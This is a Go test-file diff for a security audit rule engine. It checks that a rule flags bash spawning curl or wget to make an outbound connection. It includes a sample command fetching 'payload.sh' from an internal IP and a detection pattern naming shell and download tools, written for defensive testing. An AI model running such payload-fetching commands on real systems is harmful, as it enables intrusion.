@@ -194,3 +194,46 @@ func TestApplyRulesEnrichesSensitiveFileWritePermissionAndDeleteEvents(t *testin
 		})
 	}
 }
+
+func TestApplyRulesEnrichesSuspiciousProcessChainEvent(t *testing.T) {
+	event := audit.Event{
+		EventType:         "network_connect",
+		ParentProcessName: "bash",
+		ParentCmdline:     "/bin/bash -l",
+		ProcessName:       "curl",
+		Cmdline:           "/usr/bin/curl http://10.0.0.8/payload.sh",
+		DstIP:             "10.0.0.8",
+		DstPort:           80,
+		Severity:          "info",
+		RiskScore:         0,
+	}
+	rules := []Rule{{
+		ID:        "rule-process-chain",
+		Name:      "Shell 下载工具外联链路",
+		EventType: "network_connect",
+		Enabled:   true,
+		Severity:  "high",
+		RiskScore: 85,
+		MatchExpr: Expression{
+			Operator: "and",
+			Conditions: []Condition{
+				{Field: "event_type", Op: "eq", Value: "network_connect"},
+				{Field: "parent_process_name", Op: "in", Values: []string{"bash", "sh", "dash", "zsh"}},
+				{Field: "process_name", Op: "in", Values: []string{"curl", "wget"}},
+			},
+		},
+		Tags: []string{"process-chain", "network"},
+	}}
+
+	enriched := ApplyRules(event, rules)
+
+	if enriched.Severity != "high" || enriched.RiskScore != 85 {
+		t.Fatalf("expected suspicious process chain risk, got severity=%q score=%d", enriched.Severity, enriched.RiskScore)
+	}
+	if len(enriched.RuleNames) != 1 || enriched.RuleNames[0] != "Shell 下载工具外联链路" {
+		t.Fatalf("expected process chain rule hit, got %#v", enriched.RuleNames)
+	}
+	if len(enriched.RuleMatches) != 3 {
+		t.Fatalf("expected process chain match details, got %#v", enriched.RuleMatches)
+	}
+}
